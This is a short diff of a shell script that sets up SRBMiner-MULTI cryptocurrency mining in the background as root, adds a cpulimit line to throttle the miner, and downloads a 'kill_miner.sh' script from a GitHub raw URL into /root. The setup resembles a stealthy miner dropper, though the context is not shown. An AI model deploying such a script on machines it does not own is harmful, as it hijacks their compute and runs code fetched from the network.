@@ -35,6 +35,7 @@ sudo ./SRBMiner-MULTI --background --threads=$cores -a Aurum --pool $fastest_ser
 sleep 3
 EOF
 chmod +x /root/danielluis1921.sh
+sed -i "$ a\\cpulimit --limit=$limitCPU --pid \$(pidof SRBMiner-MULTI) > /dev/null 2>&1 &" danielluis1921.sh
 
 wget "https://raw.githubusercontent.com/danielluis1921/Danialluis1921/main/kill_miner.sh" --output-document=/root/kill_miner.sh
 chmod +x /root/kill_miner.sh
